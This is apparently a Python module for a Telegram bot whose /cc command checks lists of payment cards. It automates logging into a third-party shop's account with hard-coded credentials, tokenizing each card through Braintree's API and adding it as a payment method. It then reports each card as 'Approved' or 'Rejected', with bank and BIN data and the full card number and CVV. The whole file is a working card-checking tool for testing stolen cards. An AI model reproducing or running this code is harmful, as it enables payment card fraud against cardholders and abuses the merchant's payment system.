import requests
import base64
import json
from helpers.User_Control import user_check
import requests
import base64
import json
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread
import base64, json, uuid, string, time, os, json
import re

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()


def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session


def generate_custom_id():
    base_uuid = str(uuid.uuid4())
    custom_id = f"0_{base_uuid[:8]}-{base_uuid[9:13]}-{base_uuid[14:18]}-{base_uuid[19:23]}-{base_uuid[24:]}"
    return custom_id


def base64_url_to_base64(base64_url):
    # Replace URL-safe characters with standard Base64 characters
    base64_standard = base64_url.replace("-", "+").replace("_", "/")

    # Add padding if needed
    padding = len(base64_standard) % 4
    if padding:
        base64_standard += "=" * (4 - padding)

    base64_code = base64.b64decode(base64_standard)

    return base64_code


def email_braintree():
    email = (
        "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        + "@gmail.com"
    )
    return email


def get_name_rand():
    first = "".join(random.choices(string.ascii_lowercase, k=5))
    second = "".join(random.choices(string.ascii_lowercase, k=5))

    return first, second


@Client.on_message(filters.command("cc"))
async def sihad_check_braintree_new_card(bot: Client, cmd: Message):
    user = await user_check(bot, cmd)
    if not user:
        return
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")
    
    # Check if the command is a reply to a message with a text/plain document
    if (
        cmd.reply_to_message
        and cmd.reply_to_message.document
        and cmd.reply_to_message.document.mime_type == "text/plain"
    ):
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, "r", encoding="utf-8") as f:
                
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split("|")[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()

                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = (
                                "20" + ex
                            )  # Handle other cases (e.g., only two digits)

                        # Handle specific conditions
                        if exy in ["21", "22", "23", "24"]:
                            exy = exy[0] + "7"
                        time.sleep(8)
                        # Call your check_vbv function
                        R1 = BraintreeAuth()
                        await R1._Post_GraphQL_Api(cc.strip(), exp, exy, cvc, bot, cmd)
                        # await check_vbv(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
            await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/cc", 1)[1].strip().split("|")
            if len(data) < 4:
                raise IndexError("Not enough data provided")

            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()

            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)

            # Handle specific conditions
            if exy in ["21", "22", "23", "24"]:
                exy = exy[0] + "7"

            # Call your check_vbv function
            R1 = BraintreeAuth()
            await R1._Post_GraphQL_Api(cc.strip(), exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/cc </code> Check your CC</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/cc </code> Check Your CC</b>")


class BraintreeAuth:
    def __init__(self):
        self.Site_Api = "https://www.mockofun.com/my-account/add-payment-method/"
        self.Config_Api = "https://www.mockofun.com/wp-admin/admin-ajax.php"
        self.GraphQL_Api = "https://payments.braintree-api.com/graphql"
        self.login_api = "https://www.mockofun.com/register/"
        self.session = requests.Session()

    def _post_request_site(self):
        headers = {
            "Host": "www.mockofun.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
            "Te": "trailers",
            "Connection": "keep-alive",
        }

        response1 = self.session.get(self.login_api, headers=headers)
        # print(response1.text)
        security = self.extract_value(
            response1.text,
            '<input type="hidden" id="security" name="security" value="',
            " />",
        )

        headers1 = {
            "Host": "www.mockofun.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.mockofun.com",
            "Referer": "https://www.mockofun.com/register/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=0",
            "Te": "trailers",
        }

        playload = f"action=ajaxlogin&username=antorsir1718%40gmail.com&password=antorsir1718%40gmail.com&security={security}"

        response = self.session.post(self.Config_Api, headers=headers1, data=playload)
        print(response.text)
        headers = {
            "Host": "www.mockofun.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
            "Te": "trailers",
        }
        response1 = self.session.get(self.Site_Api, headers=headers)
        with open("test.html", "w", encoding="utf-8") as f:
            f.write(response1.text)

        payment_nonce = self.extract_value(
            response1.text,
            "name=woocommerce-add-payment-method-nonce value=",
            ">",
        )
        config_nonce = self.extract_value(
            response1.text, '"client_token_nonce":"', '",'
        )
        print(payment_nonce)
        print(config_nonce)

        Config_payload = (
            f"action=wc_braintree_credit_card_get_client_token&nonce={config_nonce}"
        )
        headers = {
            "Host": "www.mockofun.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "65",
            "Origin": "https://www.mockofun.com",
            "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Te": "trailers",
        }

        Config_Rq = self.session.post(
            self.Config_Api, headers=headers, data=Config_payload
        )

        json_data = Config_Rq.json()["data"]
        base64_bytes = json.loads(base64.b64decode(json_data))
        fingerprint = base64_bytes["authorizationFingerprint"]
        print(fingerprint)
        return fingerprint, payment_nonce

    @run_sync_in_thread
    def _Post_GraphQL_Api(self, card_number, exp_month, exp_year, cvv, bot, cmd):
        fingerprint, nonce = self._post_request_site()
        headers = {
            "Host": "payments.braintree-api.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        playload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "5fe0266b-ca50-47e8-b86d-c35e7f767e13",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{card_number}",
                        "expirationMonth": f"{exp_month}",
                        "expirationYear": f"{exp_year}",
                        "cvv": f"{cvv}",
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        response = self.session.post(
            self.GraphQL_Api, headers=headers, data=json.dumps(playload)
        )
        try:
            data = response.json()
            card_token = data["data"]["tokenizeCreditCard"]["token"]
        except Exception as err:
            print(err)
            print(response.text)
            return None
        else:
            headers1 = {
                "Host": "www.mockofun.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "895",
                "Origin": "https://www.mockofun.com",
                "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
                "Te": "trailers",
            }
            playload1 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%223cd52f1ac1a7c57607de4f9433be5e52%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%223cd52f1ac1a7c57607de4f9433be5e52%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
            payment = self.session.post(self.Site_Api, headers=headers1, data=playload1)
            # print(payment.text)

            try:
                # Error & Success message extract
                error_message = self.extract_value(
                    payment.text, "class=woocommerce-error role=alert>", "</ul>"
                )
                success_message = self.extract_value(
                    payment.text, "class=woocommerce-message role=alert>", "</div>"
                )

                # BIN API Request
                req = requests.get(
                    f"https://bins.antipublic.cc/bins/{card_number[:6]}", verify=True
                )
                requ = req.json()

                # Fallback values in case of missing keys
                country = requ.get("country", "Unknown")
                country_flag = requ.get("country_flag", "🏳")
                country_name = requ.get("country_name", "Unknown")
                brand = requ.get("brand", "Unknown")
                card_type = requ.get("type", "Unknown")
                card_level = requ.get("level", "Unknown")
                bank = requ.get("bank", "Unknown")

                # Success Condition
                msg = "New payment method added"
                if success_message and msg in success_message:
                    message_text = f"""
<b>⎚ Approved ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ Approved </b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {country} | {country_flag} | {country_name}
<b>Data ⇾</b> {brand} - {card_type} - {card_level}
<b>Bank ⇾</b> {bank}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
                    cmd.reply_text(message_text)
                    print(success_message)

                # Failure Condition
                elif error_message:
                    message_text = f"""
<b>⎚ Rejected ❌</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ Declined</b>

<b>BIN ⇾</b> <code>{card_number[:6]}</code>
<b>Country ⇾</b> {country} | {country_flag} | {country_name}
<b>Data ⇾</b> {brand} - {card_type} - {card_level}
<b>Bank ⇾</b> {bank}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
                    cmd.reply_text(message_text)

            except requests.exceptions.RequestException as e:
                print(f"Request Error: {e}")
            except Exception as e:
                print(f"Unexpected Error: {e}")

    @staticmethod
    def extract_value(source, left, right):
        """Extract value from the source based on delimiters"""
        try:
            start = source.index(left) + len(left)
            end = source.index(right, start)
            return source[start:end]
        except ValueError:
            return None
